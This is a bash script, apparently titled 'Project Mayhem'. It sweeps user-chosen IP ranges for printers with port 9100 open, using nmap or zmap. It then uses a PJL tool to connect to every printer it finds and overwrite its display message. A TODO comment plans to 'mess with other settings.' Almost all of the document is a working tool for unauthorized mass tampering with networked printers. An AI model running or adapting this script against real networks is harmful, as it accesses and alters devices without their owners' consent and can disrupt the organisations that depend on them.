#!/bin/bash

IP="0.0.0.0"            # IP to start scanning from
SUB="0"                 # Subnet - How big of a range to scan
MSG="Test"              # What will display on the printer
setIP=false             # To see whether or not an IP and subnet have been set
MAP=0                   # What *map command to use

function msg
{
	clear
	echo "What message do you want displayed?"
	read -e MSG
}

function ip
{
	clear
	echo "Please enter desired IP CORRECTLY!"
	read IP
	echo "Please enter desired subnet i.e. 8,16,24"
	read SUB
	setIP=true
}

function map
{
	MAPS="nmap zmap"
	clear
	echo "Please select which comman (nmap/zmap) you would like to use:"
	select choice in $MAPS; do
		if [ $choice == "zmap" ]; then
			MAP=1
		else
			MAP=0
		fi
	done
}

function run
{
	if [ $MAP == 1 ]; then
		sudo zmap -p 9100 -o output.txt $IP/$SUB
	else
		nmap -p 9100 -oG - $IP/$SUB | grep "9100" | grep "open" | cut -d " " -f 2 > output.txt
	fi	

	FILE="output.txt"

	cat $FILE | while read LINE
	do
		cd ~/pjllib/pft
		echo "server $LINE" > mypftscript.txt
		echo "connect" >> mypftscript.txt
		echo "message \"$MSG\"" >> mypftscript.txt
		echo "quit" >> mypftscript.txt
		./pft < mypftscript.txt
		cd ~
	done
	
	sleep 1
	clear
	echo "Project Mayhem completed."
	sleep 3
	clear
	exit
}

OPTIONS="Change_IP Change_Message Change_Map Run_Script Print2Printer Exit"
while [ true ]; do
	clear
	echo "Current IP to scan ~>    $IP"
	echo "Current subnet mask ~>   $SUB"
	echo "Message to be displayed:"
	echo "$MSG"
	echo ""
	echo "Please select an option..."
	select opt in $OPTIONS; do
		if [ $opt == "Change_IP" ]; then
			ip
		elif [ $opt == "Change_Message" ]; then
			msg
		elif [ $opt == "Change_Map" ]; then
			map
		elif [ $opt == "Run_Script" ]; then
			if [ $setIP != true ]; then
				echo "IP and Subnet not set"
				sleep 3
			else
				run
			fi
		elif [ $opt == "Exit" ]; then
			clear
			exit
		else
			echo "Not an option silly..."
			sleep 3
		fi
		clear
		echo "Current IP to scan ~>    $IP"
		echo "Current subnet mask ~>   $SUB"
		echo "Message to be displayed:"
		echo "$MSG"
		echo ""
		echo "Please select an option..."
		echo "1) Change_IP"
		echo "2) Change_Message"
		echo "3) Change_Map"
		echo "4) Run_Script"
		echo "5) Print2Printer"
		echo "6) Exit"
	done
done

# Things to get done:
# 	Mess with other settings
